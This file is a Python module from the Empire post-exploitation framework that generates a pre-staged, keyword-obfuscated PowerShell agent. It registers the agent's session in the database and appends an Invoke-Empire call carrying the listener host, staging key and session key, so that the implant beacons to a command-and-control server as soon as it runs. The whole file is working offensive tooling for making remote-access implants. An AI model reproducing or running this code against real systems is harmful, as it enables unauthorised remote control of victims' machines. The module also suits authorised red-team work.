from __future__ import print_function

import os
import string

# Empire imports
from builtins import object
from lib.common import helpers


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Generate Agent',

            'Author': ['@harmj0y'],

            'Description': ("Generates an agent code instance for a specified listener, "
                            "pre-staged, and register the agent in the database. This allows "
                            "the agent to begin beconing behavior immediately."),

            'Background': True,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': True,

            'Language': 'Python',

            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate the agent for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language to generate for the agent.',
                'Required': True,
                'Value': ''
            },
            'OutFile': {
                'Description': 'Output file to write the agent code to.',
                'Required': True,
                'Value': '/tmp/agent'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def execute(self):

        listener_name = self.options['Listener']['Value']
        language = self.options['Language']['Value']
        out_file = self.options['OutFile']['Value']

        if listener_name not in self.mainMenu.listeners.activeListeners:
            print(helpers.color("[!] Error: %s not an active listener"))
            return None

        active_listener = self.mainMenu.listeners.activeListeners[listener_name]

        chars = string.ascii_uppercase + string.digits
        session_id = helpers.random_string(length=8, charset=chars)

        staging_key = active_listener['options']['StagingKey']['Value']
        delay = active_listener['options']['DefaultDelay']['Value']
        jitter = active_listener['options']['DefaultJitter']['Value']
        profile = active_listener['options']['DefaultProfile']['Value']
        kill_date = active_listener['options']['KillDate']['Value']
        working_hours = active_listener['options']['WorkingHours']['Value']
        lost_limit = active_listener['options']['DefaultLostLimit']['Value']
        if 'Host' in active_listener['options']:
            host = active_listener['options']['Host']['Value']
        else:
            host = ''

        # add the agent
        self.mainMenu.agents.add_agent(session_id, '0.0.0.0', delay, jitter, profile, kill_date, working_hours,
                                       lost_limit,
                                       listener=listener_name, language=language)

        # get the agent's session key
        session_key = self.mainMenu.agents.get_agent_session_key_db(session_id)

        agent_code = self.mainMenu.listeners.loadedListeners[active_listener['moduleName']].generate_agent(
            active_listener['options'], language=language)

        if language.lower() == 'powershell':
            agent_code += "\nInvoke-Empire -Servers @('%s') -StagingKey '%s' -SessionKey '%s' -SessionID '%s';" % (
                host, staging_key, session_key, session_id)
        else:
            print(helpers.color('[!] Only PowerShell agent generation is supported at this time.'))
            return ''

            # Get the random function name generated at install and patch the stager with the proper function name
        agent_code = helpers.keyword_obfuscation(agent_code)

        # TODO: python agent generation - need to patch in crypto functions from the stager...

        print(helpers.color("[+] Pre-generated agent '%s' now registered." % session_id))

        # increment the supplied file name appropriately if it already exists
        i = 1
        out_file_orig = out_file
        while os.path.exists(out_file):
            parts = out_file_orig.split('.')
            if len(parts) == 1:
                base = out_file_orig
                ext = None
            else:
                base = '.'.join(parts[0:-1])
                ext = parts[-1]

            if ext:
                out_file = "%s%s.%s" % (base, i, ext)
            else:
                out_file = "%s%s" % (base, i)
            i += 1

        f = open(out_file, 'w')
        f.write(agent_code)
        f.close()

        print(helpers.color("[*] %s agent code for listener %s with sessionID '%s' written out to %s" % (
            language, listener_name, session_id, out_file)))
        print(helpers.color("[*] Run sysinfo command after agent starts checking in!"))
